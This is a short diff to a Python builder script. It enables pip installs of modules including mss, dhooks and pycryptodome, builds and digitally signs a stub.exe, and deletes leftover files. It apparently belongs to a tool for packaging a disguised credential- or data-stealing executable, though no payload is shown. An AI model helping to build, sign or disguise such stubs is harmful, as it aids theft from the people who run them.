@@ -51,14 +51,14 @@ class Build:
     def moduleInstaller(self):
         try:
             os.system('cls')
-            #os.system("pip install psutil")
-            #os.system("pip install wmi")
-            #os.system("pip install mss")
-            #os.system("pip install pycryptodome")
-            #os.system("pip install pypiwin32")
-            #os.system("pip install dhooks")
-            #os.system("pip install requests")
-            #os.system("pip install uuid")
+            os.system("pip install psutil")
+            os.system("pip install wmi")
+            os.system("pip install mss")
+            os.system("pip install pycryptodome")
+            os.system("pip install pypiwin32")
+            os.system("pip install dhooks")
+            os.system("pip install requests")
+            os.system("pip install uuid")
             os.system("pip install pyinstaller")
         except:
             os.system('cls')
@@ -80,11 +80,11 @@ class Build:
         except:
             os.system("cls")
             print("An error occurred while signing your file with a digital signature, please use the stub.exe file in the dist/stub.exe folder")
-            #self.clearJunkFiles()
+            self.clearJunkFiles()
         else:
             os.system('cls')
             print(f"Your File signed Succesffuly, your file is => {outputFile}")
-            #self.clearJunkFiles()
+            self.clearJunkFiles()
     def clearJunkFiles(self):
         try:
             os.remove('stub.py')
